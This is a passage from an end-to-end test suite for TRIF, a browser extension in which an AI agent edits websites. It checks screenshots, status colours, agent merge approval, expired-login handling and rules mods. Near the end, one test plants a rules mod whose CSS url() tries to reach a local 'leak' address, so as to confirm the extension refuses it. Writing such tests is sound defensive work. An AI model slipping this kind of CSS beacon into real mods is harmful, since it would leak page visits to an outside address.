        if (JSON.stringify(after) !== JSON.stringify(before)) throw new Error(`the user's view changed: ${JSON.stringify(before)} -> ${JSON.stringify(after)}`);
        return results[0];
      });
    }
    // Fresh Firefox went permissive while running (Settings, above).
    const grantedNow = !this.allSites && !chrome;
    // Firefox only gives the running background captureTab if it had <all_urls> when it started (screenshot.js):
    // given now, a background capture says to restart Firefox. (Someone who updated from a version that
    // required it has it from the start, and gets captureTab, as this suite did before.)
    if (grantedNow) {
      // (Firefox's background is an event page: once it has been suspended and started again it has captureTab,
      // so either answer is right, depending on whether that happened since.)
      await r.check('Firefox: <all_urls> given while running: a background screenshot works, or says to restart Firefox; nothing opened', async () => {
        const before = await view();
        const x = await this.cli(['screenshot', '--tab', String(sweepTab), '-o', path.join(this.work, 'given.png')], { json: true });
        const after = await view();
        if (JSON.stringify(after) !== JSON.stringify(before)) throw new Error(`the user's view changed: ${JSON.stringify(before)} -> ${JSON.stringify(after)}`);
        if (x.status === 0 && x.json && x.json.how === 'tab') return 'captured (the background had started again since)';
        if (x.status === 0 || !/quit and reopen Firefox/.test(x.stderr)) throw new Error(`${x.status} ${x.stderr}`);
        return x.stderr.trim().split('\n')[0];
      });
    }
    for (const full of this.allSites ? [false, true] : []) {
      await r.check(`trif screenshot${chrome ? ' --copy' : ''}${full ? ' --full' : ''} of a tab that isn't showing: works, and the user's tabs and focus stay as they were`, async () => {
        const before = await view();
        const isActive = (await this.ext(`async (id) => (await chrome.tabs.get(id)).active`, [sweepTab]));
        if (isActive) throw new Error('the sweep tab is in front; the check needs it in the background');
        const file = this.r.file(`${this.label}-${String(++this.shots).padStart(2, '0')}-trif-screenshot-background${full ? '-full' : ''}.png`);
        const x = await this.cli(['screenshot', '--tab', String(sweepTab), ...(chrome ? ['--copy'] : []), ...(full ? ['--full'] : []), '-o', file], { json: true, timeoutMs: 90000 });
        if (x.status !== 0 || !x.json) throw new Error(`trif screenshot: ${x.stderr || x.stdout}`);
        const after = await view();
        if (JSON.stringify(after) !== JSON.stringify(before)) throw new Error(`the user's view changed: ${JSON.stringify(before)} -> ${JSON.stringify(after)}`);
        const want = this.o.browser === 'firefox' ? 'tab' : 'copy';
        if (x.json.how !== want) throw new Error(`captured by ${x.json.how}, want ${want}`);
        if (x.json.stale) throw new Error(`the copy wasn't being drawn (its window was covered): ${x.json.note}`);
        const size = pngSize(file);
        if (!size || size.w < 200 || size.h < 200 || size.bytes < 3000) throw new Error(`not much of a PNG: ${JSON.stringify(size)}`);
        if (full && size.h < size.w) throw new Error(`a full page of a 2400px-tall page should be tall: ${JSON.stringify(size)}`);
        return `${x.json.how}, ${size.w}x${size.h}, ${size.bytes} bytes${x.json.slices ? `, slices at ${x.json.slices.join('/')} of ${x.json.viewport}px` : ''}; note: ${x.json.note || '(none)'}`;
      });
    }
    await this.ext(`async (id) => { await chrome.tabs.remove(id); }`, [sweepTab]).catch(() => {});
  }

  // ---- screenshots of the panel as narrow as a side panel (for people to look at; no checks)

  /** The panel as narrow as a side panel (on), or back to its usual size. */
  async narrow(on) {
    const panelWin = await this.panel(`async () => (await chrome.windows.getCurrent()).id`);
    await this.ext(`async (id, width, height) => { await chrome.windows.update(id, { width, height }); }`, [panelWin, on ? 380 : 420, on ? 640 : 900]);
    // (Headless Chrome keeps its pages 1280 wide whatever the window: emulate the size there.)
    if (!this.d.cdp) return;
    const sid = await this.d._attach(this.panelCtx);
    if (on) await this.d.cdp.send('Emulation.setDeviceMetricsOverride', { width: 380, height: 640, deviceScaleFactor: 2, mobile: false }, sid);
    else await this.d.cdp.send('Emulation.clearDeviceMetricsOverride', {}, sid);
  }

  async narrowShots() {
    try {
      await this.narrow(true);
      await sleep(800);
      await this.shot(this.panelCtx, 'panel-narrow-x');
      // A site TRIF is off for (localhost): "The robot is off.", and in the bar the dim robot and settings.
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url }); }`, [this.xTab, `http://localhost:${this.o.servers.port}/?e2e=narrow`]);
      await this.waitPanel('the panel on localhost\'s gate', (x) => x.site === 'localhost' && x.gate, 10000);
      await this.d.pointerAway(this.panelCtx); // the robot at rest, not under the last click
      await this.waitBar('the gate\'s bar', GATE_BAR, Scenario.dim);
      await sleep(300);
      await this.shot(this.panelCtx, 'panel-narrow-gate');
      await this.r.check('settings open from the gate', () => this.settingsOpen('panel-narrow-gate-settings'));
      // A page without a site: the landing page.
      await this.ext(`async (id) => { await chrome.tabs.update(id, { url: 'about:blank' }); }`, [this.xTab]);
      await this.waitPanel('the panel on a page without a site', (x) => !x.site, 10000).catch(() => {});
      await sleep(500);
      await this.shot(this.panelCtx, 'panel-narrow-no-site');
      await this.r.check('landing page: only the robot, and settings in the bar, when the tab has no website', async () => {
        const x = await this.panel(`async () => {
          const shown = (sel) => { const e = document.querySelector(sel); return !!e && e.getClientRects().length > 0; };
          const img = document.querySelector('#landing .landing-icon');
          if (img && !img.complete) await new Promise((ok) => { img.onload = img.onerror = ok; });
          return { landing: shown('#landing'), composer: shown('.composer'), notice: shown('#notice'),
            loaded: !!img && img.naturalWidth > 0, width: img ? Math.round(img.getBoundingClientRect().width) : 0,
            words: Array.from(document.querySelectorAll('#landing .landing-words p'), (p) => p.textContent.trim()),
            version: chrome.runtime.getManifest().version };
        }`);
        const words = JSON.stringify([`TRIF ${x.version}`, 'Open any website to start fixing it.']);
        if (!x.landing || x.composer || x.notice || !x.loaded || x.width !== 145 || JSON.stringify(x.words) !== words) throw new Error(JSON.stringify(x));
        await this.waitBar('the landing page\'s bar', ['#settings-btn']);
        return `the 145px shaded robot, "${x.words.join('" / "')}"; in the bar only settings; no notice or composer`;
      });
      await this.r.check('settings open from the landing page', () => this.settingsOpen('panel-narrow-no-site-settings'));
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url }); }`, [this.xTab, `https://x.com:${this.o.servers.tlsPort}/home`]);
      await this.waitPanel('the panel back on x.com', (x) => x.site === 'x.com' && x.mods.length >= 3, 15000);
      await this.narrow(false);
    } catch (e) { this.r.note(`narrow panel screenshots: ${e.message}`); }
  }

  // ---- what's in the way, in colour (sidepanel.js problemNow): every green in the panel turns red while
  // TRIF is missing a part (user scripts off: the mod switches too; the helper not connected: not them,
  // since mods still run), or yellow while the agent isn't logged in (not on the landing page). The gate
  // and the landing page say what in one line; the site's page has the notices, "Mods are paused" first.

  /** How the panel looks: its problem, colours (as computed rgb) and the words it shows. */
  async looks() {
    return this.panel(`async () => {
      const q = (s) => document.querySelector(s);
      const shown = (s) => { const e = q(s); return !!e && e.getClientRects().length > 0; };
      const colour = (v) => { const i = document.createElement('i'); i.style.color = v; document.body.append(i); const c = getComputedStyle(i).color; i.remove(); return c; };
      const style = (s, prop) => (shown(s) ? getComputedStyle(q(s))[prop] : null);
      const img = q('#landing-icon');
      if (img && shown('#landing-icon') && !img.complete) await new Promise((ok) => { img.onload = img.onerror = ok; });
      return {
        classes: ['blocked', 'needs-login'].filter((c) => document.body.classList.contains(c)),
        problem: document.body.dataset.problem || '',
        dot: q('#dot').className, dotShown: shown('#dot'), dotLabel: q('#dot').getAttribute('aria-label'),
        green: colour('var(--trif-green)'), bad: colour('var(--bad)'), warn: colour('var(--warn)'),
        rim: style('#bar-robot .rim', 'fill'), gateRim: style('.gate-icon .rim', 'fill'), power: style('#site-switch', 'color'),
        modSwitch: style('#mod-list button.switch[aria-checked="true"]', 'backgroundColor'), light: style('#mod-list .light.on', 'backgroundColor'),
        send: { disabled: q('#send').disabled, title: q('#send').title },
        fix: shown('#gate-btn'), gateNote: shown('#gate-note') ? q('#gate-note').innerText.trim() : '',
        landingNote: shown('#landing-note') ? q('#landing-note').innerText.trim() : '',
        landingIcon: shown('#landing-icon') ? img.getAttribute('src') : null, landingIconLoaded: !!img && img.naturalWidth > 0,
        notices: [...document.querySelectorAll('body > .notice')].filter((n) => n.getClientRects().length).map((n) => n.querySelector('.title')?.textContent || ''),
      };
    }`);
  }

  /** Points the test tab at `where` ('site': 127.0.0.1, TRIF on; 'gate': localhost, off; 'landing': no website). */
  async goColour(where) {
    const { port } = this.o.servers;
    const url = where === 'site' ? `http://127.0.0.1:${port}/?e2e=colour` : where === 'gate' ? `http://localhost:${port}/?e2e=colour` : 'about:blank';
    await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [this.xTab, url]);
    if (where === 'landing') await this.waitLooks('the panel on the landing page', (l) => !!l.landingIcon, 15000);
    else await this.waitPanel(`the panel on ${where}`, (x) => x.site === (where === 'site' ? '127.0.0.1' : 'localhost') && x.gate === (where === 'gate'), 15000);
    await this.d.pointerAway(this.panelCtx);
  }

  /** Whether two computed rgb() colours are the same, give or take rounding (and a transition's last step). */
  static same(a, b) {
    const n = (c) => (String(c).match(/[\d.]+/g) || []).slice(0, 3).map(Number);
    const [x, y] = [n(a), n(b)];
    return x.length === 3 && y.length === 3 && x.every((v, i) => Math.abs(v - y[i]) <= 3);
  }

  /** Waits until the panel looks as `pred` wants, then returns how it looks (or throws with that). */
  async waitLooks(what, pred, timeoutMs = 20000) {
    let last = null;
    try {
      await waitFor(what, async () => { last = await this.looks(); return pred(last) ? last : null; }, { timeoutMs });
      await sleep(400); // the switches' colour transition
      return await this.looks();
    } catch (e) { throw new Error(`${e.message}: ${JSON.stringify(last)}`); }
  }

  async colourChecks() {
    const r = this.r;
    await this.narrow(true);
    try {
      // The harness's helper runs with the scratch HOME, where the agent isn't logged in (without --agent).
      await this.goColour('site');
      const first = await this.waitLooks('the panel\'s status', (x) => !!x.dot && !/Checking/.test(x.dotLabel));
      const loggedOut = /isn’t logged in/.test(first.dotLabel);
      if (loggedOut) {
        await r.check('agent not logged in, on the site\'s page: the robot and power button turn yellow (mods stay green), the login notice shows', async () => {
          const x = await this.waitLooks('yellow', (l) => l.classes.join() === 'needs-login' && l.dot === 'dot warn');
          // Mods still run without a login, so their switches and lights stay green.
          const want = { rim: x.warn, power: x.warn, modSwitch: x.green };
          for (const [k, v] of Object.entries(want)) if (!Scenario.same(x[k], v)) throw new Error(`${k} is ${x[k]}, not ${v}: ${JSON.stringify(x)}`);
          if (x.light && !Scenario.same(x.light, x.green)) throw new Error(`the running light is ${x.light}`);
          if (!x.notices.some((t) => /isn’t logged in/.test(t))) throw new Error(`no login notice: ${x.notices}`);
          // F14: no sending into a run that can only fail with that; the button says why.
          if (!x.send.disabled || !/^Log in to .+ first$/.test(x.send.title)) throw new Error(`Send: ${JSON.stringify(x.send)}`);
          await this.shot(this.panelCtx, 'panel-yellow-site');
          return `"${x.dotLabel}"; ${x.warn}`;
        });
        await r.check('agent not logged in, on the gate: the small robot yellow, a line saying so, Fix still there', async () => {
          await this.goColour('gate');
          const x = await this.waitLooks('yellow gate', (l) => l.classes.join() === 'needs-login' && !!l.gateNote);
          if (!Scenario.same(x.gateRim, x.warn) || !x.fix || !x.dotShown || x.dot !== 'dot warn' || !/isn’t logged in/.test(x.gateNote)) throw new Error(JSON.stringify(x));
          await this.waitBar('the gate\'s bar', GATE_BAR, Scenario.dim);
          await this.shot(this.panelCtx, 'panel-yellow-gate');
          return `"${x.gateNote}"`;
        });
        await r.check('agent not logged in, no website: the landing page as usual (no yellow there)', async () => {
          await this.goColour('landing');
          const x = await this.waitLooks('the landing page', (l) => !!l.landingIcon);
          if (x.classes.length || x.landingNote || x.dotShown || x.landingIcon !== 'icons/robot-shaded.svg') throw new Error(JSON.stringify(x));
          return 'green robot, no line, no dot';
        });
      } else r.note(`the agent is logged in here ("${first.dotLabel}"): no yellow checks`);

      // User scripts off: red, everything.
      const off = await r.check('user scripts off, on the site\'s page: everything red, "Mods are paused" first', async () => {
        this.scriptsRevoked = true; // the "user scripts were turned off" warnings are expected (consoleCheck, helperLogCheck)
        await this.d.revokeUserScripts(this.control);
        try {
          await waitFor('status.userScripts off', async () => (await this.cli(['status'], { json: true })).json?.extension?.userScripts === false, { timeoutMs: 20000 });
        } catch (e) {
          const probe = await this.ext(`async () => ({ api: typeof chrome.userScripts, granted: await chrome.permissions.contains({ permissions: ['userScripts'] }),
            getScripts: (() => { try { chrome.userScripts.getScripts().catch(() => {}); return 'no throw'; } catch (x) { return 'throws: ' + x.message; } })() })`).catch((x) => x.message);
          throw new Error(`${e.message}; on the setup page: ${JSON.stringify(probe)}`);
        }
        await this.goColour('site');
        const x = await this.waitLooks('red', (l) => l.problem === 'scripts' && l.classes.join() === 'blocked' && l.notices.length > 0);
        for (const k of ['rim', 'power', 'modSwitch']) if (!Scenario.same(x[k], x.bad)) throw new Error(`${k} is ${x[k]}, not ${x.bad}: ${JSON.stringify(x)}`);
        if (x.light && !Scenario.same(x.light, x.bad)) throw new Error(`the running light is ${x.light}`);
        if (x.dot !== 'dot bad') throw new Error(`dot ${x.dot}`);
        if (x.notices[0] !== 'Mods are paused') throw new Error(`notices: ${JSON.stringify(x.notices)}`);
        // F3: not logged in as well, both notices show, the paused one first.
        if (loggedOut && !x.notices.slice(1).some((t) => /isn’t logged in/.test(t))) throw new Error(`no login notice under it: ${JSON.stringify(x.notices)}`);
        // Still no sending while logged out, though the red problem holds the panel's main slot.
        if (loggedOut && (!x.send.disabled || !/^Log in to .+ first$/.test(x.send.title))) throw new Error(`Send: ${JSON.stringify(x.send)}`);
        await this.shot(this.panelCtx, loggedOut ? 'panel-scripts-off-logged-out' : 'panel-scripts-off');
        return x.notices.join(' / ');
      });
      if (off) {
        await r.check('user scripts off, on the gate: red robot, the line, no Fix button', async () => {
          await this.goColour('gate');
          const x = await this.waitLooks('red gate', (l) => l.problem === 'scripts' && !!l.gateNote);
          if (!Scenario.same(x.gateRim, x.bad) || x.fix || x.dot !== 'dot bad' || !x.dotShown || !/^Mods are paused/.test(x.gateNote)) throw new Error(JSON.stringify(x));
          await this.waitBar('the gate\'s bar', GATE_BAR, Scenario.dim);
          await this.shot(this.panelCtx, 'panel-scripts-off-gate');
          return `"${x.gateNote}"`;
        });
        await r.check('user scripts off, no website: the red robot, the line, the dot', async () => {
          await this.goColour('landing');
          const x = await this.waitLooks('red landing', (l) => l.problem === 'scripts' && !!l.landingNote);
          if (x.landingIcon !== 'icons/robot-shaded-red.svg' || !x.landingIconLoaded || !x.dotShown || !/^Mods are paused/.test(x.landingNote)) throw new Error(JSON.stringify(x));
          await this.shot(this.panelCtx, 'panel-scripts-off-landing');
          return `"${x.landingNote}"`;
        });
      }
      await r.check('user scripts on again', async () => {
        const how = await this.d.grantUserScripts(this.control);
        await waitFor('status.userScripts', async () => (await this.cli(['status'], { json: true })).json?.extension?.userScripts, { timeoutMs: 20000 });
        return how;
      });

      // The helper not connected: its wrapper gone (as before setup), and the running helper stopped.
      const host = path.join(this.trif, 'bin', 'trif-host');
      const proc = pidsMatching('host.js').find((p) => p.pid === this.helperPid);
      if (!proc || !proc.command.includes(this.trif)) throw new Error(`the helper (pid ${this.helperPid}) isn't the scratch one: ${proc && proc.command}`);
      fs.renameSync(host, `${host}.off`);
      this.helperStopped = true; // its "helper disconnected" warnings are expected (consoleCheck)
      try {
        process.kill(this.helperPid, 'SIGTERM');
        await r.check('helper not connected, on the site\'s page: the robot and power button red, the mods (still running) green', async () => {
          await this.goColour('site');
          const x = await this.waitLooks('red, helper', (l) => l.problem === 'helper' && l.classes.join() === 'blocked' && l.notices.length > 0);
          if (!Scenario.same(x.rim, x.bad) || !Scenario.same(x.power, x.bad) || x.dot !== 'dot bad') throw new Error(JSON.stringify(x));
          if (!Scenario.same(x.modSwitch, x.green) || (x.light && !Scenario.same(x.light, x.green))) throw new Error(`the mods aren't green: ${JSON.stringify(x)}`);
          if (!x.notices.includes('The TRIF helper isn’t connected')) throw new Error(`notices: ${JSON.stringify(x.notices)}`);
          await this.shot(this.panelCtx, 'panel-helper-site');
          return `rim ${x.rim}, mods ${x.modSwitch}`;
        });
        await r.check('helper not connected, on the gate: red robot, the line, no Fix button', async () => {
          await this.goColour('gate');
          const x = await this.waitLooks('red gate, helper', (l) => l.problem === 'helper' && !!l.gateNote);
          if (!Scenario.same(x.gateRim, x.bad) || x.fix || !x.dotShown || !/^The TRIF helper isn’t connected\. Run npx timsrobot setup in a terminal, then restart \w+\. Setup page$/.test(x.gateNote)) throw new Error(JSON.stringify(x));
          await this.waitBar('the gate\'s bar', GATE_BAR, Scenario.dim);
          await this.shot(this.panelCtx, 'panel-helper-gate');
          return `"${x.gateNote}"`;
        });
        await r.check('helper not connected, no website: the red robot, the line, the dot', async () => {
          await this.goColour('landing');
          const x = await this.waitLooks('red landing, helper', (l) => l.problem === 'helper' && !!l.landingNote);
          if (x.landingIcon !== 'icons/robot-shaded-red.svg' || !x.landingIconLoaded || !x.dotShown || x.dot !== 'dot bad') throw new Error(JSON.stringify(x));
          await this.waitBar('the landing page\'s bar', ['#dot', '#settings-btn']);
          await this.shot(this.panelCtx, 'panel-helper-landing');
          return `"${x.landingNote}"`;
        });
      } finally {
        fs.renameSync(`${host}.off`, host);
      }
      await r.check('helper back (Try again): the colours back to normal', async () => {
        await this.goColour('site');
        await this.waitLooks('the helper notice', (l) => l.notices.includes('The TRIF helper isn’t connected'));
        await this.panelClick('#notice .actions button');
        const st = await waitFor('the helper to answer `trif status`', async () => {
          const s = await this.cli(['status'], { json: true, timeoutMs: 15000 });
          return s.json && s.json.extension ? s.json : null;
        }, { timeoutMs: 30000 });
        this.helperPid = st.helper.pid;
        const p = pidsMatching('host.js').find((q) => q.pid === this.helperPid);
        if (!p || !p.command.includes(this.trif)) throw new Error(`the new helper (pid ${this.helperPid}) isn't the scratch one: ${p && p.command}`);
        const x = await this.waitLooks('no red', (l) => !l.classes.includes('blocked'));
        if (!Scenario.same(x.rim, (loggedOut ? x.warn : x.green))) throw new Error(JSON.stringify(x));
        return `helper pid ${this.helperPid}; ${x.classes.join() || 'green'}`;
      });
    } finally {
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url }); }`, [this.xTab, `https://x.com:${this.o.servers.tlsPort}/home`]).catch(() => {});
      await this.waitPanel('the panel back on x.com', (x) => x.site === 'x.com', 15000).catch(() => {});
      await this.narrow(false).catch(() => {});
    }
  }

  // ---- "Merge with my agent" on the edited shipped mod (upgrade scenarios, panel on x.com)

  async mergeChecks() {
    const r = this.r;
    const d = this.d;
    const chatKey = 'chat:x.com';
    const chat = () => this.ext(`async (k) => (await chrome.storage.local.get(k))[k] || null`, [chatKey]);
    const file = path.join(this.trif, 'sites', 'x.com', 'rainbow-rave.js');
    const pending = () => (JSON.parse(fs.readFileSync(path.join(this.trif, 'preinstalled.json'), 'utf8')).shipped || {})['x.com/rainbow-rave'] || {};
    const before = fs.readFileSync(file, 'utf8');
    const model = this.o.claudeModel || 'haiku';
    if (this.o.agent) {
      // This site chat's own agent and model (the panel's Settings write the same).
      await this.ext(`async (model) => { const { sitePicks = {} } = await chrome.storage.local.get('sitePicks'); sitePicks['x.com'] = { agent: 'claude', models: { claude: model } }; await chrome.storage.local.set({ sitePicks }); }`, [model]);
    }
    if (!this.o.agent) {
      // Without your login the agent can't run, so the button waits for one (F14) and says why.
      await r.check('Merge with my agent: waits for a login, and says so', async () => {
        const b = await waitFor('the merge button', () => this.panel(`async () => {
          const m = document.querySelector('li[data-mod="x.com/rainbow-rave"] .mod-update .merge');
          return m ? { disabled: m.disabled, title: m.title } : null;
        }`), { timeoutMs: 10000 });
        if (!b.disabled || !/^Log in to .+ first/.test(b.title)) throw new Error(JSON.stringify(b));
        await this.shot(this.panelCtx, 'panel-merge-needs-login');
        return `disabled: "${b.title}"`;
      });
      return;
    }
    await r.check('Merge with my agent: one click starts it, while the panel keeps refreshing', async () => {
      // Busy the panel the way real use does (status refreshes, storage changes) right before the click.
      await this.panel(`async () => { for (let i = 0; i < 5; i++) { await chrome.storage.local.set({ e2eTick: i }); document.dispatchEvent(new Event('visibilitychange')); } }`);
      await d.click(this.panelCtx, 'li[data-mod="x.com/rainbow-rave"] .mod-update .merge');
      const c = await waitFor('the merge request in the chat', async () => {
        const x = await chat();
        return x && x.messages.some((m) => m.role === 'user' && /suggest how to merge/.test(m.text)) ? x : null;
      }, { timeoutMs: 5000, intervalMs: 200 });
      await this.shot(this.panelCtx, 'panel-merge-started');
      return `chat: "${c.messages.find((m) => m.role === 'user').text}"`;
    });
    const done = (n0) => waitFor('the run to finish', async () => {
      const x = await chat();
      return x && !x.run && x.messages.length > n0 ? x : null;
    }, { timeoutMs: 6 * 60000, intervalMs: 2000 });
    await r.check(`Merge (Claude Code, ${model}): the agent proposes and waits; nothing changes yet`, async () => {
      const c = await done(1);
      await this.shot(this.panelCtx, 'panel-merge-proposal');
      r.log(`merge proposal chat: ${JSON.stringify(c.messages, null, 2)}`);
      const said = c.messages.filter((m) => m.role === 'assistant').map((m) => m.text).join('\n');
      if (fs.readFileSync(file, 'utf8') !== before) throw new Error(`rainbow-rave.js changed before the user said go ahead:\n${said.slice(-600)}`);
      if (!pending().pending) throw new Error('the update was settled by the proposal');
      if (!said.trim()) throw new Error(`no proposal in the chat: ${JSON.stringify(c.messages.slice(-3))}`);
      return said.replace(/\s+/g, ' ').slice(0, 300);
    });
    await r.check(`Merge (Claude Code, ${model}): "go ahead" merges it and settles the update`, async () => {
      const n0 = ((await chat()) || { messages: [] }).messages.length;
      await this.panel(`async (text) => { const i = document.getElementById('input'); i.value = text; i.dispatchEvent(new Event('input', { bubbles: true })); }`, ['Go ahead.']);
      await d.click(this.panelCtx, '#send');
      const c = await done(n0 + 1);
      await this.shot(this.panelCtx, 'panel-merge-done');
      r.log(`merge go-ahead chat: ${JSON.stringify(c.messages.slice(n0), null, 2)}`);
      const now = fs.readFileSync(file, 'utf8');
      if (now === before) throw new Error('rainbow-rave.js is unchanged');
      const v = /@version\s+(\S+)/.exec(now);
      const rec = await waitFor('the update to settle', async () => (pending().pending ? null : pending()), { timeoutMs: 10000 }).catch(() => null);
      if (!rec) throw new Error(`the update is still waiting (the copy says @version ${v && v[1]})`);
      const p = await this.waitPanel('the offer to go', (x) => x.mods.some((m) => m.id === 'x.com/rainbow-rave' && !m.update), 15000);
      return `@version ${v && v[1]}; ${p ? 'the panel no longer offers it' : ''}`;
    });
  }

  // ---- an expired login, with a stand-in Claude Code (sidepanel.js loginLine, runs.js loginFailed)

  /**
   * A stand-in `claude` first on the helper's PATH (config.json env.PATH) that says it's logged in (as Claude
   * Code's `auth status` does with an expired login) and answers every run the way Claude Code 2.1.319 does
   * when its login can't be refreshed. It reaches nothing. Put back after.
   */
  async expiredLoginCheck(win) {
    const dir = path.join(this.work, 'standin');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'claude'), `#!${process.execPath}
const a = process.argv.slice(2);
if (a[0] === '--version') { console.log('2.1.319 (Claude Code)'); process.exit(0); }
if (a[0] === 'auth') { console.log('{"loggedIn": true, "authMethod": "claude.ai"}'); process.exit(0); }
const t = 'Failed to authenticate: OAuth session expired and could not be refreshed';
const say = (o) => process.stdout.write(JSON.stringify(o) + '\\n');
say({ type: 'system', subtype: 'init', session_id: 'e2e-expired' });
say({ type: 'assistant', message: { model: '<synthetic>', content: [{ type: 'text', text: t }] }, error: 'authentication_failed' });
say({ type: 'result', subtype: 'success', is_error: true, result: t, session_id: 'e2e-expired' });
process.exitCode = 1;
`, { mode: 0o755 });
    const cfgFile = path.join(this.priv, 'config.json');
    const saved = fs.readFileSync(cfgFile, 'utf8');
    const cfg = JSON.parse(saved);
    cfg.env = { ...(cfg.env || {}), PATH: [dir, cfg.env?.PATH].filter(Boolean).join(':') };
    fs.writeFileSync(cfgFile, JSON.stringify(cfg, null, 2) + '\n');
    const site = '127.0.0.1';
    const chat = () => this.ext(`async (k) => (await chrome.storage.local.get(k))[k] || null`, [`chat:${site}`]);
    // The panel asks for the agents when it opens: open it again so it sees the stand-in.
    const reopen = async () => {
      await this.panel(`async () => { setTimeout(() => location.reload(), 20); return true; }`).catch(() => {});
      await sleep(800);
      this.panelCtx = await this.d.findPage('sidepanel.html');
    };
    try {
      await this.ext(`async (k) => { await chrome.storage.local.remove(k); }`, [`chat:${site}`]);
      // (The test window's own tab: x.com's is gone by now.)
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [win.tabId, `http://${site}:${this.o.servers.port}/?e2e=expired`]);
      await reopen();
      await this.waitPanel(`the panel on ${site}`, (x) => x.site === site && !x.gate, 15000);
      await this.waitLooks('Claude Code ready (the stand-in)', (l) => l.dotLabel === 'Ready · Claude Code' && !l.send.disabled, 30000);
      const message = 'hide the banner please';
      await this.panel(`async (text) => { const i = document.getElementById('input'); i.value = text; i.dispatchEvent(new Event('input', { bubbles: true })); }`, [message]);
      await this.panelClick('#send');
      const c = await waitFor('the run to finish', async () => { const x = await chat(); return x && !x.run && x.messages.length >= 2 ? x : null; }, { timeoutMs: 30000, intervalMs: 300 });
      const roles = c.messages.map((m) => [m.role, m.text]);
      if (JSON.stringify(roles) !== JSON.stringify([['user', message], ['login', 'Claude Code needs you to log in again.']])) throw new Error(`the chat: ${JSON.stringify(roles)}`);
      const x = await this.waitLooks('the login notice', (l) => l.classes.join() === 'needs-login' && l.notices.some((t) => /isn’t logged in/.test(t)), 20000);
      const shown = await waitFor('the message back in the box', () => this.panel(`async () => {
        const msgs = [...document.querySelectorAll('#messages > li')].map((li) => [li.className, li.innerText.trim()]);
        const input = document.getElementById('input').value;
        return input ? { msgs, input } : null;
      }`), { timeoutMs: 10000 });
      if (shown.input !== message) throw new Error(`the box has "${shown.input}"`);
      if (shown.msgs.some(([cls, text]) => /error|assistant/.test(cls) || /OAuth/.test(text))) throw new Error(`the chat shows: ${JSON.stringify(shown.msgs)}`);
      if (!shown.msgs.some(([cls, text]) => cls === 'msg login' && text === 'Claude Code needs you to log in again.')) throw new Error(`no login line: ${JSON.stringify(shown.msgs)}`);
      // Its own check still says logged in, so after logging in from a terminal, sending is how to tell.
      if (x.send.disabled) throw new Error(`Send is off: ${JSON.stringify(x.send)}`);
      await this.shot(this.panelCtx, 'panel-login-expired');
      // From a terminal: the plain message, and how to log in.
      const t = await this.cli(['agent', 'run', '--url', `http://${site}:${this.o.servers.port}/`, 'hi from a terminal'], { timeoutMs: 60000 });
      if (t.status !== 1 || !t.stderr.includes('error: Claude Code needs you to log in again. Run `trif agent login --agent claude`') || /OAuth/.test(t.stdout + t.stderr)) {
        throw new Error(`trif agent run: ${t.status} ${t.stderr} ${t.stdout}`);
      }
      return `"${x.notices.find((n) => /logged in/.test(n))}"; chat: ${roles.map((m) => m[0]).join(', ')}; the box: "${shown.input}"`;
    } finally {
      fs.writeFileSync(cfgFile, saved);
      await this.panel(`async () => { document.getElementById('input').value = ''; }`).catch(() => {});
      await this.ext(`async (k) => { await chrome.storage.local.remove(k); }`, [`chat:${site}`]).catch(() => {});
    }
  }

  // ---- rules mods (helper/lib/rules.js): data, run by TRIF's own code

  async rulesModCheck(win) {
    const site = '127.0.0.1';
    const base = `http://${site}:${this.o.servers.port}`;
    const dir = path.join(this.trif, 'sites', site);
    const head = (name) => `// ==WebMod==\n// @name ${name}\n// @match *://127.0.0.1/*\n// @rules\n// ==/WebMod==\n`;
    const good = path.join(dir, 'e2e-rules.js'), bad = path.join(dir, 'e2e-rules-bad.js');
    try {
      await this.cli(['disable', '127.0.0.1/e2e-banner', '--url', site]); // (the harness's own mod changes #target too)
      fs.writeFileSync(good, head('Rules') + JSON.stringify({
        css: '#title { color: rgb(1, 2, 3) }',
        hide: ['a[href="/two.html"]'],
        replace: [{ in: '#target', find: 'Original', with: 'Ruled' }],
        filter: [{ items: 'p', hideIfText: 'Host' }],
      }) + '\n');
      fs.writeFileSync(bad, head('Bad rules') + JSON.stringify({ css: `body { background: url(${base}/e2e-rules-leak) }` }) + '\n');
      await waitFor('the rules mod registered, the bad one refused', async () => {
        const st = await this.cli(['status'], { timeoutMs: 20000 });
        return /e2e-rules\s+registered/.test(st.stdout) && /e2e-rules-bad\s+NOT SENT: .*only data:/.test(st.stdout) ? st.stdout : null;
      }, { timeoutMs: 20000, intervalMs: 500 });
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [win.tabId, `${base}/?e2e=rules`]);
      await sleep(1500);
      const look = async () => (await this.cli(['run', '--tab', String(win.tabId), `({
        color: getComputedStyle(document.getElementById('title')).color,
        linkShown: document.querySelector('a[href="/two.html"]').getClientRects().length > 0,
        target: document.getElementById('target').textContent,
        hostShown: [...document.querySelectorAll('p')].filter((p) => p.textContent.includes('Host')).some((p) => p.getClientRects().length > 0),
      })`], { timeoutMs: 20000 })).stdout;
      let last = '';
      const before = JSON.parse(await waitFor('the rules applied', async () => { const o = last = await look(); return /"target":\s*"Ruled text\."/.test(o) ? o : null; }, { timeoutMs: 10000, intervalMs: 300 }).catch((e) => { throw new Error(`${e.message}: ${last}`); }));
      if (before.color !== 'rgb(1, 2, 3)' || before.linkShown || before.hostShown) throw new Error(`the rules: ${JSON.stringify(before)}`);
      // what the page adds later is ruled too
      await this.cli(['run', '--tab', String(win.tabId), `(() => { const p = document.createElement('p'); p.id = 'later'; p.textContent = 'Host later'; document.body.append(p); const q = document.createElement('p'); q.id = 'later2'; q.textContent = 'Original again'; document.getElementById('target').append(q); return 1; })()`], { timeoutMs: 20000 });
      const later = await waitFor('the rules on what appeared later', async () => {
        const o = JSON.parse((await this.cli(['run', '--tab', String(win.tabId), `({ hidden: document.getElementById('later').getClientRects().length === 0, text: document.getElementById('later2').textContent })`], { timeoutMs: 20000 })).stdout);
        return o.hidden && o.text === 'Ruled again' ? o : null;
      }, { timeoutMs: 10000, intervalMs: 300 });
      if (this.o.servers.requests.some((q) => q.url.startsWith('/e2e-rules-leak'))) throw new Error('the bad rules mod loaded its address');
